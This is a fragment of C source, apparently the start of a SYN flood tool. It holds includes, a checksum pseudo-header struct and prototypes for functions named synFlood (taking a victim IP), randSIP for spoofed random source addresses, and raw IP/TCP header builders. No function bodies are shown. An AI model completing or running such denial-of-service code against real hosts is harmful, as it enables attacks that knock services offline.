
#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <netdb.h>
char datagram[4096] , source_ip[32];
struct iphdr *iph = (struct iphdr *) datagram;
struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
struct pseudo_header    //for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};
int synFlood(char victimIP[32], int packet);
void randSIP(char source_ip[32]);
void createTCPHeader(struct pseudo_header psh,struct sockaddr_in sin);
void createIPHeader(char source_ip[32], struct sockaddr_in *sin);
unsigned short csum(unsigned short *ptr,int nbytes);
